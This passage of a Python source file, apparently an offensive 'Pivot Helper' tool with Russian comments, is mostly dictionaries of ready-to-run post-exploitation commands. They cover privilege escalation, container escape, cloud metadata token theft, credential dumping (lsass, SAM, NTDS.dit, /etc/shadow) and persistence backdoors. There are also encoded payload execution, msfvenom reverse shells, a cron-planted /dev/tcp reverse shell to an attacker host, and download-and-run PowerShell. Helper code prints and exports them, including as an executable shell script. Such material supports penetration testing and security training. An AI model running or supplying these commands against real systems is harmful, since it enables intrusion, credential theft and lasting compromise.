        "find / -writable -type f 2>/dev/null | head -50"
    ),
    "World-writable dirs": (
        "find / -perm -0002 -type d 2>/dev/null | head -30"
    ),
    "World-writable files": (
        "find / -perm -0002 -type f 2>/dev/null | head -30"
    ),
    "Writable в PATH": (
        "echo $PATH | tr ':' '\\n' | while read d; do "
        "[ -w \"$d\" ] && echo \"WRITABLE: $d\"; done"
    ),
    "Sudo без пароля": "sudo -n -l 2>/dev/null",
    "sudoers writable": (
        "ls -la /etc/sudoers /etc/sudoers.d/ 2>/dev/null"
    ),

    # ── Shadow / Passwords ──
    "Passwd файл": "cat /etc/passwd",
    "Shadow (если доступен)": "cat /etc/shadow 2>/dev/null",
    "Passwd- (backup)": "cat /etc/passwd- /etc/shadow- 2>/dev/null",
    "Хеши в SQLite/конфигах": (
        "grep -rE 'password|passwd|secret' /var/www /opt /srv 2>/dev/null | head -30"
    ),
    "История bash": (
        "cat ~/.bash_history ~/.zsh_history 2>/dev/null | "
        "grep -iE 'pass|sudo|ssh|mysql|token'"
    ),
    "История у всех юзеров": (
        "for u in $(cut -d: -f6 /etc/passwd); do "
        "echo \"=== $u ===\"; cat $u/.bash_history 2>/dev/null; done"
    ),
    "SSH ключи": (
        "find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null"
    ),
    "SSH конфиги": (
        "cat /root/.ssh/config /home/*/.ssh/config 2>/dev/null"
    ),

    # ── NFS / Mounts ──
    "NFS (no_root_squash)": (
        "showmount -e {target_ip}\n"
        "# Если есть no_root_squash — монтируем:\n"
        "mkdir /tmp/nfs; mount -t nfs {target_ip}:/export /tmp/nfs"
    ),
    "Mounts": "mount; cat /proc/mounts; df -h",

    # ── Docker / LXD / K8s ──
    "Docker group": (
        "id | grep -q docker && "
        "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ),
    "docker.sock writable": (
        "ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null"
    ),
    "LXD group": (
        "id | grep -q lxd && "
        "lxc image import alpine.tar.gz --alias alpine && "
        "lxc init alpine privesc -c security.privileged=true && "
        "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true && "
        "lxc start privesc && lxc exec privesc /bin/sh"
    ),
    "K8s SA token": (
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | "
        "cut -c1-100; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null"
    ),

    # ── GTFOBins / Kernel ──
    "GTFOBins автоматически": (
        "sudo -l | grep -oP '\\(ALL\\) NOPASSWD: \\K.*' | "
        "while read c; do echo \"Check https://gtfobins.github.io/gtfobins/$(basename $c)/\"; done"
    ),
    "Kernel CVE check (uname)": (
        "uname -r  # сверь с: CVE-2022-0847 Dirty Pipe (5.8-5.16.11), "
        "CVE-2021-4034 PwnKit (pkexec), CVE-2021-3493 OverlayFS (Ubuntu)"
    ),
    "PwnKit (pkexec) check": (
        "pkexec --version 2>&1 | head -1  # <0.120 → CVE-2021-4034"
    ),
    "Dirty Pipe check": (
        "uname -r  # 5.8 ≤ version < 5.16.11 → CVE-2022-0847"
    ),

    # ── Tooling ──
    "LinPEAS": (
        "curl -L https://github.com/carlospolop/PEASS-ng/releases/"
        "latest/download/linpeas.sh | sh"
    ),
    "LinEnum": (
        "curl -L https://raw.githubusercontent.com/rebootuser/"
        "LinEnum/master/LinEnum.sh | sh"
    ),
    "linux-smart-enumeration": (
        "curl -L https://raw.githubusercontent.com/diego-treitos/"
        "linux-smart-enumeration/master/lse.sh | sh -s -- -l 2"
    ),
}


# ===========================================================================
# Windows privesc (расширенный)
# ===========================================================================

WINDOWS_PRIVESC = {
    # ── Recon ──
    "whoami /all": "whoami /all",
    "Privileges": "whoami /priv",
    "Local admins": "net localgroup Administrators",
    "Users": "net user",
    "Группы": "net localgroup",
    "Env vars": "set",
    "Systeminfo": "systeminfo",
    "OS version": "ver; wmic os get Caption,Version,BuildNumber /value",

    # ── Services / Paths ──
    "Службы (unquoted path)": (
        "wmic service get name,displayname,pathname,startmode | "
        "findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\""
    ),
    "Все службы": "sc query state=all",
    "Службы + бинарники": (
        "wmic service get name,pathname,startmode,state /format:table"
    ),
    "Writable Services": (
        "accesschk.exe -uwcqv \"Everyone\" * /accepteula"
    ),
    "Unquoted service paths": (
        "wmic service get name,displayname,pathname,startmode | "
        "findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\""
    ),

    # ── Tasks / Autorun ──
    "Задачи в планировщике": "schtasks /query /fo LIST /v",
    "Автозагрузка": (
        "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run; "
        "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    ),
    "Startup folder": (
        "dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""
    ),
    "AlwaysInstallElevated": (
        "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated; "
        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
    ),

    # ── Credentials ──
    "Saved credentials": "cmdkey /list",
    "WiFi профили": (
        "netsh wlan show profile; "
        "netsh wlan show profile name=\"NAME\" key=clear"
    ),
    "Unattend файлы": (
        "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*sysprep.inf 2>nul"
    ),
    "SAM/SYSTEM (бэкапы)": (
        "dir /a /s C:\\Windows\\System32\\config\\* 2>nul"
    ),
    "GPP passwords (SYSVOL)": (
        "findstr /S /I cpassword \\\\domain.local\\sysvol\\*.xml"
    ),
    "Антивирус": (
        "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName"
    ),

    # ── Token / Impersonation ──
    "PrintSpoofer (SeImpersonate)": (
        ".\\PrintSpoofer.exe -i -c cmd  # если есть SeImpersonatePrivilege"
    ),
    "GodPotato": (
        ".\\GodPotato.exe -cmd \"cmd /c whoami\""
    ),
    "JuicyPotato": (
        ".\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {{CLSID}}"
    ),
    "RoguePotato": (
        ".\\RoguePotato.exe -r {{lhost}} -e \"cmd.exe\" -l 9999"
    ),
    "SweetPotato": (
        ".\\SweetPotato.exe -p cmd.exe"
    ),

    # ── DLL / Hijack ──
    "DLL Hijacking (проверка)": (
        "Get-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\*\" | "
        "Where-Object {$_.ImagePath} | Select ImagePath"
    ),
    "Writable PATH dirs": (
        "for %A in (\"%PATH:;=\" \"%\") do @dir /b \"%~A\" >nul 2>&1 && "
        "icacls \"%~A\" | findstr /i \"everyone\""
    ),

    # ── Credential dumping ──
    "Read SAM (если админ)": (
        "reg save HKLM\\SAM C:\\Temp\\sam.hive; "
        "reg save HKLM\\SYSTEM C:\\Temp\\system.hive; "
        "# Скачать оба на атакующего:\n"
        "impacket-secretsdump -sam sam.hive -system system.hive LOCAL"
    ),
    "Dump lsass (procdump)": (
        "procdump.exe -accepteula -ma lsass.exe lsass.dmp\n"
        "# Затем на атакующем:\n"
        "pypykatz lsa minidump lsass.dmp"
    ),
    "Dump lsass (comsvcs)": (
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
        "MiniDump (Get-Process lsass).Id C:\\Temp\\lsass.dmp full"
    ),
    "NTDS.dit (DC)": (
        "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds\" q q\n"
        "# Затем: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
    ),

    # ── AD ──
    "Kerberoasting (impacket)": (
        "impacket-GetUserSPNs domain/user:pass -dc-ip {dc_ip} -request"
    ),
    "AS-REP Roasting": (
        "impacket-GetNPUsers domain/ -dc-ip {dc_ip} -usersfile users.txt "
        "-format hashcat -outputfile asrep.txt"
    ),
    "DCSync": (
        "impacket-secretsdump domain/user:pass@{dc_ip} -just-dc-user krbtgt"
    ),

    # ── Tooling ──
    "WinPEAS (загрузить)": (
        "powershell -ep bypass -c \"IEX(New-Object Net.WebClient)."
        "DownloadString('http://{lhost}:8000/winPEAS.ps1')\""
    ),
    "PowerUp": (
        "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\""
    ),
    "Seatbelt": (
        ".\\Seatbelt.exe -group=all -full"
    ),
    "SharpUp": (
        ".\\SharpUp.exe audit"
    ),
}


# ===========================================================================
# Container escape one-liners
# ===========================================================================

CONTAINER_ESCAPE = {
    "Detect container": (
        "cat /proc/1/cgroup | grep -q docker && echo DOCKER; "
        "ls -la /.dockerenv 2>/dev/null; "
        "cat /proc/self/cgroup; "
        "hostname"
    ),
    "Capabilities": (
        "cat /proc/self/status | grep Cap; "
        "capsh --print 2>/dev/null"
    ),
    "docker.sock → root": (
        "# Если виден /var/run/docker.sock:\n"
        "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it "
        "alpine chroot /mnt sh"
    ),
    "containerd.sock": (
        "# ctr escape\n"
        "ctr -a /run/containerd/containerd.sock -n k8s.io images list"
    ),
    "CAP_SYS_ADMIN → mount host": (
        "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && "
        "mkdir /tmp/cgrp/x && "
        "echo 1 > /tmp/cgrp/x/notify_on_release && "
        "host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` && "
        "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && "
        "echo '#!/bin/sh' > /cmd && "
        "echo 'cat /etc/shadow > /output' >> /cmd && "
        "chmod a+x /cmd && "
        "sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
    ),
    "hostPath → /etc/cron": (
        "# Если /etc/cron.d/ доступен из контейнера:\n"
        "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' "
        "> /etc/cron.d/escape"
    ),
    "hostPID → nsenter": (
        "# Если запущен с --pid=host:\n"
        "nsenter -t 1 -m -u -i -n -p -- /bin/bash"
    ),
    "hostNetwork → sniff": (
        "# С --network=host: tcpdump доступен\n"
        "tcpdump -i any -w /tmp/cap.pcap"
    ),
    "kubelet API (10250)": (
        "curl -sk https://127.0.0.1:10250/pods\n"
        "curl -sk https://127.0.0.1:10255/pods"
    ),
    "K8s SA token abuse": (
        "# С SA-токеном и cluster-admin:\n"
        "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) "
        "--server=https://kubernetes.default.svc "
        "--insecure-skip-tls-verify get pods -A"
    ),
    "runc CVE-2024-21626": (
        "# Утечка fd через runc < 1.1.11 (Leaky Vessels):\n"
        "runc --version; docker version"
    ),
    "cgroup v1 release_agent (CVE-2022-0492)": (
        "# Требуется CAP_SYS_ADMIN или userns:\n"
        "unshare -UrCm sh -c 'mount -t cgroup -o rdma cgroup /tmp/cg; "
        "echo 1 > /tmp/cg/notify_on_release; ...'"
    ),
}


# ===========================================================================
# Cloud metadata one-liners
# ===========================================================================

CLOUD_METADATA = {
    "AWS IMDSv1 (curl)": (
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    ),
    "AWS IMDSv1 (wget)": (
        "wget -qO- http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    ),
    "AWS IMDSv2 (curl, 2 шага)": (
        "TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" "
        "-H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\") && "
        "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" "
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    ),
    "AWS user-data": (
        "curl http://169.254.169.254/latest/user-data"
    ),
    "AWS ECS task metadata": (
        "curl http://169.254.170.2/v2/metadata\n"
        "curl http://169.254.170.2/v2/credentials"
    ),
    "GCP metadata (curl)": (
        "curl -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/"
        "instance/service-accounts/default/token"
    ),
    "GCP metadata (recursive)": (
        "curl -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true"
    ),
    "Azure IMDS (curl)": (
        "curl -H 'Metadata: true' "
        "\"http://169.254.169.254/metadata/identity/oauth2/token?"
        "api-version=2018-02-01&resource=https://management.azure.com/\""
    ),
    "Azure instance info": (
        "curl -H 'Metadata: true' "
        "\"http://169.254.169.254/metadata/instance?api-version=2021-02-01\""
    ),
    "DigitalOcean": (
        "curl http://169.254.169.254/metadata/v1/"
    ),
    "Alibaba Cloud": (
        "curl http://100.100.100.200/latest/meta-data/ram/security-credentials/"
    ),
    "Oracle Cloud": (
        "curl http://169.254.169.254/opc/v1/instance/"
    ),
    "Kubernetes env dump": (
        "env | grep -iE 'k8s|kube|sa_|secret|token'"
    ),
}


# ===========================================================================
# Credential dumping one-liners
# ===========================================================================

CRED_DUMP = {
    "Linux /etc/shadow": (
        "cat /etc/shadow 2>/dev/null; "
        "sudo cat /etc/shadow 2>/dev/null"
    ),
    "Linux /etc/passwd + shadow unshadow": (
        "unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt && "
        "john /tmp/hashes.txt  # или hashcat -m 1800"
    ),
    "Linux PAM (с creds)": (
        "find / -name '*.pcap' -o -name '*.pcapng' 2>/dev/null"
    ),
    "Linux SSH keys": (
        "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | "
        "while read k; do echo \"=== $k ===\"; cat $k; done"
    ),
    "Linux env secrets": (
        "env | grep -iE 'password|secret|token|key|api'"
    ),
    "Linux config secrets": (
        "grep -rE '(password|secret|token|api[_-]?key)' "
        "/etc /opt /var/www /srv 2>/dev/null | head -50"
    ),
    "Windows SAM + SYSTEM (reg save)": (
        "reg save HKLM\\SAM C:\\Temp\\sam.hive; "
        "reg save HKLM\\SYSTEM C:\\Temp\\system.hive; "
        "reg save HKLM\\SECURITY C:\\Temp\\security.hive\n"
        "# На атакующем:\n"
        "impacket-secretsdump -sam sam.hive -system system.hive "
        "-security security.hive LOCAL"
    ),
    "Windows LSA secrets": (
        "reg save HKLM\\SECURITY C:\\Temp\\security.hive; "
        "# затем impacket-secretsdump -security security.hive -system system.hive LOCAL"
    ),
    "Windows NTDS.dit (DC)": (
        "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds\" q q\n"
        "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
    ),
    "Windows DPAPI": (
        "# mimikatz\n"
        "dpapi::cred /in:%APPDATA%\\Microsoft\\Credentials\\*"
    ),
    "Windows WDigest (enable plaintext)": (
        "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest "
        "/v UseLogonCredential /t REG_DWORD /d 1 /f"
    ),
    "Windows browser creds": (
        "# SharpChromium, LaZagne, или: copy Chrome's Login Data sqlite"
    ),
    "Windows Wi-Fi passwords": (
        "for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| "
        "findstr \"All User Profile\"') do "
        "netsh wlan show profile name=\"%a\" key=clear | "
        "findstr \"Key Content\""
    ),
}


# ===========================================================================
# Persistence one-liners
# ===========================================================================

PERSISTENCE = {
    "Linux cron (user)": (
        "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/persist.sh') | crontab -"
    ),
    "Linux cron (system)": (
        "echo '*/5 * * * * root /tmp/persist.sh' > /etc/cron.d/persist && "
        "chmod 644 /etc/cron.d/persist"
    ),
    "Linux systemd service": (
        "cat > /etc/systemd/system/persist.service <<EOF\n"
        "[Unit]\nDescription=Persist\n\n"
        "[Service]\nExecStart=/tmp/persist.sh\nRestart=always\n\n"
        "[Install]\nWantedBy=multi-user.target\nEOF\n"
        "systemctl enable persist.service"
    ),
    "Linux bashrc": (
        "echo '/tmp/persist.sh &' >> ~/.bashrc"
    ),
    "Linux profile.d": (
        "echo '/tmp/persist.sh &' > /etc/profile.d/persist.sh"
    ),
    "Linux SSH authorized_keys": (
        "mkdir -p ~/.ssh && "
        "echo 'ssh-ed25519 AAAA... attacker@box' >> ~/.ssh/authorized_keys"
    ),
    "Linux LD_PRELOAD (root-level)": (
        "echo '/tmp/evil.so' > /etc/ld.so.preload"
    ),
    "Linux PAM backdoor": (
        "# В /etc/pam.d/common-auth добавить кастомный модуль\n"
        "# Или: pam_exec или pam_python с проверкой мастер-пароля"
    ),
    "Windows registry Run (HKCU)": (
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
        "/v Persist /t REG_SZ /d \"C:\\Temp\\persist.exe\" /f"
    ),
    "Windows registry Run (HKLM)": (
        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
        "/v Persist /t REG_SZ /d \"C:\\Temp\\persist.exe\" /f"
    ),
    "Windows schtasks": (
        "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\persist.exe\" "
        "/sc onlogon /ru System /f"
    ),
    "Windows service": (
        "sc create Persist binPath= \"C:\\Temp\\persist.exe\" start= auto && "
        "sc start Persist"
    ),
    "Windows WMI subscription": (
        "# PowerShell:\n"
        "$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription "
        "-Arguments @{Name='persist';EventNameSpace='root\\cimv2';"
        "QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent "
        "WITHIN 60 WHERE TargetInstance ISA Win32_PerfFormattedData_PerfOS_System'}"
    ),
    "Windows Startup folder": (
        "copy C:\\Temp\\persist.exe \"%APPDATA%\\Microsoft\\Windows\\"
        "Start Menu\\Programs\\Startup\\persist.exe\""
    ),
    "Windows Image File Execution Options": (
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        "Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ "
        "/d \"C:\\Temp\\persist.exe\" /f"
    ),
}


# ===========================================================================
# Payload encoding (расширенный)
# ===========================================================================

PAYLOAD_ENCODING = {
    "Bash base64 exec": (
        'echo "BASH_COMMAND" | base64 -w0\n'
        '# На цели:\n'
        'echo "BASE64_STRING" | base64 -d | bash'
    ),
    "Bash base64 + eval": (
        'eval "$(echo "BASE64_STRING" | base64 -d)"'
    ),
    "PowerShell Base64 (UTF-16LE)": (
        '# Кодирование:\n'
        'PS> $cmd = "COMMAND"; '
        '$b = [System.Text.Encoding]::Unicode.GetBytes($cmd); '
        '[Convert]::ToBase64String($b)\n'
        '# Запуск:\n'
        'powershell -EncodedCommand BASE64'
    ),
    "PowerShell Base64 (обфускация pipeline)": (
        '# Кодируем + вызываем через [scriptblock]::Create(...)\n'
        'PS> $c = [ScriptBlock]::Create("COMMAND"); '
        '$b = [Text.Encoding]::Unicode.GetBytes($c); '
        '[Convert]::ToBase64String($b)\n'
        'powershell -nop -e <B64>'
    ),
    "Python exec base64": (
        'import base64; exec(base64.b64decode("BASE64"))'
    ),
    "PHP eval base64": (
        'php -r \'eval(base64_decode("BASE64"));\''
    ),
    "Ruby eval base64": (
        'ruby -e "eval(Base64.decode64(\'BASE64\'))"'
    ),
    "Perl eval base64": (
        'perl -MMIME::Base64 -e \'eval decode_base64("BASE64")\''
    ),
    "URL encode": (
        '# Python:\n'
        'python3 -c "import urllib.parse; print(urllib.parse.quote(open(\'payload.txt\').read()))"'
    ),
    "URL double-encode": (
        '# Python:\n'
        'python3 -c "import urllib.parse; '
        'print(urllib.parse.quote(urllib.parse.quote(open(\'payload.txt\').read())))"'
    ),
    "Hex encode": (
        '# Python:\n'
        'python3 -c "print(open(\'payload.txt\',\'rb\').read().hex())"'
    ),
    "Hex decode exec (bash)": (
        'echo HEX_STRING | xxd -r -p | bash'
    ),
    "XOR (single byte)": (
        '# Python:\n'
        'python3 -c "d=open(\'payload.bin\',\'rb\').read(); k=0x42; '
        'print(bytes(b^k for b in d).hex())"'
    ),
    "XOR + base64 (Python exec)": (
        '# Encode:\n'
        'python3 -c "import base64; '
        'd=open(\'payload.bin\',\'rb\').read(); '
        'print(base64.b64encode(bytes(b^0x42 for b in d)).decode())"\n\n'
        '# Decode+exec:\n'
        'python3 -c "import base64; '
        'exec(bytes(b^0x42 for b in base64.b64decode(\'B64\')))"'
    ),
    "Gzip + base64": (
        '# Сжатие + кодирование:\n'
        'gzip -c payload | base64 -w0\n\n'
        '# На цели:\n'
        'echo "STRING" | base64 -d | gunzip > payload'
    ),
    "Gzip + base64 (exec)": (
        'eval "$(echo "STRING" | base64 -d | gunzip)"'
    ),
    "PowerShell IEX base64": (
        'powershell -nop -w hidden -e BASE64_UTF16LE'
    ),
    "Certutil decode base64": (
        '# Сохранить base64 в file.b64, потом:\n'
        'certutil -decode file.b64 file.exe'
    ),
    "ECHO + certutil (Windows upload)": (
        '# Разбить base64 на строки, склеить через echo:\n'
        'echo BASE64_PART1 > file.b64\n'
        'echo BASE64_PART2 >> file.b64\n'
        'certutil -decode file.b64 file.exe'
    ),
    "Certutil encode": (
        'certutil -encode payload.exe payload.b64'
    ),
    "Base64 (binary → text, короткая)": (
        '# Encode:\n'
        'base64 -w0 payload.bin > payload.b64\n\n'
        '# Decode:\n'
        'base64 -d payload.b64 > payload.bin'
    ),
    "MSFVenom (encode multiple)": (
        'msfvenom -p windows/x64/shell_reverse_tcp '
        'LHOST={lhost} LPORT={lport} '
        '-e x64/xor_dynamic -i 5 -f exe -o shell.exe'
    ),
    "MSFVenom (encoded shellcode)": (
        'msfvenom -p windows/x64/shell_reverse_tcp '
        'LHOST={lhost} LPORT={lport} '
        '-e x64/xor_dynamic -i 10 -f raw -o shell.bin'
    ),
    "Donut (shellcode from PE/.NET)": (
        'donut -f 1 -o payload.bin -a 2 -p "args" implant.exe'
    ),
    "Sgn (shellcode encoder)": (
        'sgn -a 64 -f raw -i payload.bin -o payload.sgn -m 1 -e 1'
    ),
}


# ===========================================================================
# Утилиты вывода
# ===========================================================================

# Все категории в одном месте
ALL_CATEGORIES = {
    "reverse": ("Reverse shells", REVERSE_SHELLS),
    "bind": ("Bind shells", BIND_SHELLS),
    "tty": ("TTY upgrade", TTY_UPGRADE),
    "transfer": ("File transfer", FILE_TRANSFER),
    "pivot": ("Pivoting", PIVOTING),
    "linux": ("Linux privesc", LINUX_PRIVESC),
    "windows": ("Windows privesc", WINDOWS_PRIVESC),
    "container": ("Container escape", CONTAINER_ESCAPE),
    "cloud": ("Cloud metadata", CLOUD_METADATA),
    "creds": ("Credential dumping", CRED_DUMP),
    "persist": ("Persistence", PERSISTENCE),
    "encode": ("Payload encoding", PAYLOAD_ENCODING),
}


def _print_dict_commands(d: dict, title: str, lhost: str = "",
                         lport: str = "4444", target_ip: str = "",
                         dc_ip: str = "", ssh_host: str = "",
                         M_ip: str = "", count_limit: int = 100) -> None:
    """Показать словарь команд с подстановкой параметров."""
    ctx = {
        "lhost": lhost or "LHOST",
        "lport": lport or "LPORT",
        "target_ip": target_ip or "TARGET_IP",
        "dc_ip": dc_ip or "DC_IP",
        "ssh_host": ssh_host or "SSH_HOST",
        "M_ip": M_ip or "M_IP",
    }
    for i, (name, cmd) in enumerate(d.items()):
        if i >= count_limit:
            break
        try:
            formatted = cmd.format(**ctx)
        except Exception:
            formatted = cmd
        table = Table(title=f"[bold cyan]{name}[/bold cyan]",
                      show_header=False, border_style="dim",
                      title_justify="left")
        table.add_column("Command")
        for line in formatted.split("\n"):
            table.add_row(f"[green]{line}[/green]")
        console.print(table)


def _print_dict_compact(d: dict, title: str) -> None:
    """Компактный вывод (одна строка на элемент)."""
    table = Table(title=title)
    table.add_column("#", style="yellow", width=4)
    table.add_column("Item", style="cyan", max_width=50)
    for i, name in enumerate(d.keys(), 1):
        table.add_row(str(i), name)
    console.print(table)


# ===========================================================================
# Проверка инструментов
# ===========================================================================

PIVOT_TOOLS = [
    ("nc", "netcat — приём/передача через TCP/UDP"),
    ("ncat", "nmap netcat — nc с SSL/шпаргалками"),
    ("socat", "socat — TCP/UDP relay, PTY stabilization"),
    ("ssh", "SSH — pivot через -L/-R/-D/-J"),
    ("chisel", "Chisel — reverse tunnel + SOCKS"),
    ("ligolo-ng", "Ligolo-ng — современный pivot"),
    ("proxychains4", "proxychains4 — проксирование через SOCKS"),
    ("sshuttle", "sshuttle — VPN-over-SSH"),
    ("impacket-smbserver", "impacket smbserver — SMB-шара"),
    ("msfvenom", "metasploit payload generator"),
    ("msfconsole", "metasploit framework"),
    ("donut", "Donut — shellcode generator"),
    ("sgn", "Shikata Ga Nai — shellcode encoder"),
    ("mimikatz", "Mimikatz (Windows)"),
    ("bloodhound-python", "BloodHound collector"),
    ("linpeas", "LinPEAS"),
    ("winpeas", "WinPEAS"),
    ("pspy64", "pspy — мониторинг процессов"),
    ("kubectl", "kubectl — K8s client"),
    ("docker", "docker CLI"),
    ("curl", "curl"),
    ("wget", "wget"),
]


def check_tools() -> dict[str, bool]:
    """Проверить наличие инструментов в PATH."""
    out: dict[str, bool] = {}
    for name, _desc in PIVOT_TOOLS:
        out[name] = shutil.which(name) is not None
    return out


def show_tools() -> None:
    """Показать таблицу инструментов."""
    status = check_tools()
    table = Table(title=f"🔧 Pivot tools ({len(PIVOT_TOOLS)})")
    table.add_column("Tool", style="cyan", width=22)
    table.add_column("Назначение", style="white", max_width=50)
    table.add_column("Статус", width=10)
    for name, desc in PIVOT_TOOLS:
        ok = status.get(name, False)
        table.add_row(
            name, desc,
            "[green]✓[/green]" if ok else "[red]✗[/red]",
        )
    console.print(table)

    missing = [n for n, ok in status.items() if not ok]
    if missing:
        console.print(f"\n[dim]Отсутствуют: {len(missing)}. "
                      f"Установка на Kali/Parrot:[/dim]")
        console.print(
            "[dim]sudo apt install netcat-openbsd socat ssh proxychains4 "
            "sshuttle chisel[/dim]"
        )
        console.print(
            "[dim]pip install impacket donut-shellcode bloodhound[/dim]"
        )


# ===========================================================================
# Поиск по всем категориям
# ===========================================================================

def search_all(query: str) -> list[tuple[str, str, str]]:
    """
    Поиск подстроки по всем категориям.
    Возвращает список (category, item_name, command).
    """
    if not query:
        return []
    q = query.lower()
    results: list[tuple[str, str, str]] = []
    for key, (title, d) in ALL_CATEGORIES.items():
        for name, cmd in d.items():
            if q in name.lower() or q in cmd.lower():
                results.append((title, name, cmd))
    return results


def show_search(query: str) -> None:
    """Поиск и вывод результатов."""
    results = search_all(query)
    if not results:
        console.print(f"[yellow]Ничего не найдено по '{query}'.[/yellow]")
        return
    console.print(f"[cyan]🔍 Найдено: {len(results)}[/cyan]\n")
    for cat, name, cmd in results[:50]:
        table = Table(title=f"[bold cyan]{cat} → {name}[/bold cyan]",
                      show_header=False, border_style="dim")
        table.add_column("Cmd")
        for line in cmd.split("\n")[:8]:
            table.add_row(f"[green]{line}[/green]")
        console.print(table)


# ===========================================================================
# Экспорт
# ===========================================================================

def export_to_file(category: str, lhost: str = "", lport: str = "4444",
                   target_ip: str = "", fmt: str = "md",
                   out_path: str | None = None) -> Path | None:
    """
    Экспорт категории в файл.
    category: 'all' | любой из ALL_CATEGORIES ключей
    fmt: 'md' | 'txt' | 'json' | 'sh'
    """
    if category == "all":
        cats = list(ALL_CATEGORIES.items())
    else:
        if category not in ALL_CATEGORIES:
            console.print(f"[red]Неизвестная категория: {category}[/red]")
            console.print(f"[dim]Доступно: all, {', '.join(ALL_CATEGORIES)}[/dim]")
            return None
        cats = [(category, ALL_CATEGORIES[category])]

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = "".join(c if c.isalnum() or c in "._-" else "_"
                   for c in category)[:40]
    ext = {"md": ".md", "txt": ".txt", "json": ".json", "sh": ".sh"}.get(fmt, ".md")
    if not out_path:
        out_path = str(PIVOT_DIR / f"pivot_{safe}_{ts}{ext}")

    ctx = {
        "lhost": lhost or "LHOST",
        "lport": lport or "LPORT",
        "target_ip": target_ip or "TARGET_IP",
        "dc_ip": "DC_IP",
        "ssh_host": "SSH_HOST",
        "M_ip": "M_IP",
    }

    try:
        if fmt == "json":
            data = {
                "generated": datetime.now().isoformat(),
                "lhost": lhost, "lport": lport, "target_ip": target_ip,
                "categories": {k: dict(v[1]) for k, v in cats},
            }
            Path(out_path).write_text(
                json.dumps(data, indent=2, ensure_ascii=False),
                encoding="utf-8",
            )
        elif fmt == "sh":
            lines = [
                "#!/usr/bin/env bash",
                f"# Pivot Helper cheatsheet",
                f"# Generated: {datetime.now().isoformat()}",
                f"# LHOST={lhost or 'LHOST'}, LPORT={lport or 'LPORT'}",
                "",
                "set -e",
                "",
            ]
            for key, (title, d) in cats:
                lines.append(f"# ===== {title} =====")
                for name, cmd in d.items():
                    lines.append(f"# --- {name} ---")
                    try:
                        lines.append(cmd.format(**ctx))
                    except Exception:
                        lines.append(cmd)
                    lines.append("")
            Path(out_path).write_text("\n".join(lines), encoding="utf-8")
            try:
                import os
                os.chmod(out_path, 0o755)
            except Exception:
                pass
        elif fmt == "txt":
            lines = []
            for key, (title, d) in cats:
                lines.append(f"===== {title} =====")
                for name, cmd in d.items():
                    lines.append(f"--- {name} ---")
                    try:
                        lines.append(cmd.format(**ctx))
                    except Exception:
                        lines.append(cmd)
                    lines.append("")
            Path(out_path).write_text("\n".join(lines), encoding="utf-8")
        else:  # md
            lines = [f"# Pivot / Post-Exploitation Cheatsheet", ""]
            lines.append(f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M')}  ")
            if lhost:
                lines.append(f"**LHOST:** `{lhost}`  ")
            if lport:
                lines.append(f"**LPORT:** `{lport}`  ")
            lines.append("")
            lines.append("---")
            lines.append("")
            for key, (title, d) in cats:
                lines.append(f"## {title}")
                lines.append("")
                for name, cmd in d.items():
                    lines.append(f"### {name}")
                    lines.append("")
                    lines.append("```bash")
                    try:
                        lines.append(cmd.format(**ctx))
                    except Exception:
